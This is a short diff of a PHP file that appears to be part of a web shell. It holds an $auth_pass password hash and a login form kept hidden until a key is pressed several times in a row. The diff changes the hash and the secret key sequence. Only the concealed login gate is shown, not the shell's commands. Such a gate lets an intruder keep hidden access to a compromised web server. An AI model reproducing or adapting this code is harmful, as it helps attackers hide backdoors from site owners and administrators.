@@ -1,5 +1,5 @@
 <?php
-$auth_pass = "$2y$12$wiTED0ZXsBmp6xlvn/QzVeM23DIczzFO3o97oU8z28Y7dVJOk3JDe";
+$auth_pass = "2b2abc5a7d63b5489a546c7a520cd7b03e1f26ac67635b8df247501f8b5cb99a";
 
 function Login() {
     die("<html>
@@ -14,9 +14,9 @@ function Login() {
     <script>
     let clickCount = 0;
     document.addEventListener('keydown', function(event) {
-        if (event.key === '3') {
+        if (event.key === '8') {
             clickCount++;
-            if (clickCount === 3) {
+            if (clickCount === 8) {
                 document.getElementById('login-form').style.display = 'block';
             }
         } else {
